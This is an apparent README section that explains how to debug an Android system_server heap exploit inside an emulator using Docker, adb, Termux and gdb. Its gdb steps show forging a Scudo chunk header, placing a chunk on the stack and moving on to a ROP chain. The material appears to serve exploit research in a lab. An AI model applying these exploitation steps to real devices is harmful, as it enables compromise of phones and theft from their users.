# Debugging

If you'd like to debug the exploit and figure out what is going on there's a couple extra steps to do.

### Setup Docker

backup the `make_emulator_vulnerable.sh` and copy `debugging/make_emulator_vulnerable.sh` to the case-study folder.
```
# in the case-study folder
cp make_emulator_vulnerable.sh make_vuln_back.sh
cp debugging/make_emulator_vulnerable.sh .
```

rebuild the docker, when the docker is started everything is set up but the exploit is not attempted. Instead the script simply spawns a shell in the docker container.

### scudocookie

copy the scudocookie folder to the docker container `/debugging/` folder. In the case-study folder run:
```
docker cp ../scudocookie emu:/debugging/
```

### Install gdb on the emulator

First download the [termux app](https://github.com/termux/termux-app/releases/download/v0.118.0/termux-app_v0.118.0+github-debug_x86_64.apk)

Copy the apk to the docker container and install it on the phone:
```
docker cp termux-app_v0.118.0+github-debug_x86_64.apk emu:/debugging/
docker exec -it emu /bin/bash
adb install /debugging/termux-app_v0.118.0+github-debug_x86_64.apk
```

Run the `setup_debugging_phone.sh` script in the `debugging` folder to upload all the necessary debugging files to the phone.

```
cd /debugging && ./setup_debugging_phone.sh
``` 

Then run the following to install gdb using termux (run this script a few times it's quite finicky)
```
adb push /debugging/termux_install.sh /data/local/tmp
adb shell
/data/local/tmp/termux_install.sh # run a few times
```

To check if it worked:
``` 
adb shell
PATH=$PATH:/data/data/com.termux/files/usr/bin
gdb 
```

this should spawn gdb, quit and proceed to actually testing the exploit

## Exploit debugging

attach to system_server: (After failing to run the exploit wait a little, 20 seconds, so the system server is up and running)
```
adb shell
cd /data/local/tmp
PATH=$PATH:/data/data/com.termux/files/usr/bin
gdb -p $(pgrep system_server) -x init.gdb
```

The init.gdb sets up the necessary breakpoints and scripts to help walk through the exploit and make it succeed (mostly).

Now in another terminal run the exploit:
```
docker exec -it emu /bin/bash
adb shell am start -n "com.services/com.services.MainActivity" -a android.intent.action.MAIN -c android.intent.category.LAUNCHER
```

This should trigger the preset breakpoint. The following gdb commands will step through the exploit, ensuring that correctly forge the chunk header (which normally our exploit needs to guess) and avoiding race conditions.

gdb commands:
```
c #skip first native_handle_create
c #skip first onTransact
c #skip second onTransact
wow1 # forge chunk and continue
c # attack app will now send second payload to write to the stack
c # skip first onTransact
c # skip second onTranscat
ni # step over secondary chunk malloc
xinfo $rax # check that secondary chunk is onn the stack (if not do: call (void*)malloc(0x1fd00) until you get chunk on stack, then set $rax to that)
bmcp # setp up to android::Parcel::read() memcpy call
c # go to breakpoint
wow2 # all stalling to go the ropchain
```



